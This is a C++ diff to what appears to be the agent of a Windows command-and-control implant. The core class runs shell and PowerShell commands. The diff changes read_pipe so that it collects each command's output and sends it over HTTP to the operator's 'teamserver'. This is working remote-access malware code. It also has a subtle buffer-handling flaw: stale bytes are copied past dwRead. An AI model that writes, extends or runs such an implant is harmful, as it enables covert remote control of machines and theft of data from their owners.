@@ -7,12 +7,17 @@
 #include "dependencies.h"
 #include "process.h"
 #include "core.h"
+#include "HttpCommunicator.h"
 
 // TBD: This could lead to buffer overflows -> check if it is enough
 #define BUFSIZE 4096
 
 // UTF-8 regex
 #define UTF8_DETECT_REGEXP  "^([\x09\x0A\x0D\x20-\x7E]|[\xC2-\xDF][\x80-\xBF]|\xE0[\xA0-\xBF][\x80-\xBF]|[\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}|\xED[\x80-\x9F][\x80-\xBF]|\xF0[\x90-\xBF][\x80-\xBF]{2}|[\xF1-\xF3][\x80-\xBF]{3}|\xF4[\x80-\x8F][\x80-\xBF]{2})*$"
+
+core* core::instance = NULL;
+bool core::terminated = false;
+//Communicator *core::communicator = NULL;
 
 core::core() {
 	HCRYPTPROV hCryptProv;
@@ -48,10 +53,12 @@ core::core() {
 
 	// we will assign the identifier
 	this->identifier = base64EncodedIdentifier;
+	core::instance = this;
 }
 
 core::core(std::string identifier) {
 	this->identifier = identifier;
+	core::instance = this;
 }
 
 std::string core::execute_command(std::string cmd){
@@ -101,20 +108,36 @@ std::string core::execute_powershell(std::string cmd) {
 
 }
 
+bool invalidChar(char c)
+{
+	return !(c >= 0 && c < 128);
+}
+
 void core::read_pipe(HANDLE rdPipe) {
 	DWORD dwRead;
-	CHAR chBuf[BUFSIZE];
+	BYTE chBuf[BUFSIZE];
 	BOOL bSuccess = FALSE;
+	std::string completeResult = "";
 
 	for (;;)
 	{
 		bSuccess = ReadFile(rdPipe, chBuf, BUFSIZE, &dwRead, NULL);
 		if (!bSuccess || dwRead == 0) break;
+		
+		char str[(sizeof chBuf) + 1];
+		memcpy(str, chBuf, sizeof chBuf);
+		str[sizeof chBuf] = 0; // Null termination.
 
+		std::string tempResult(str);
+		completeResult += tempResult;
 
+		//core::communicator->send_output();
 		// Send response to teamserver
 
 		if (!bSuccess) break;
 	}
-	
+	completeResult.erase(remove_if(completeResult.begin(), completeResult.end(), invalidChar), completeResult.end());
+
+	// we will assume HTTP always for now
+	HttpCommunicator::communicator->send_output(completeResult);
 }
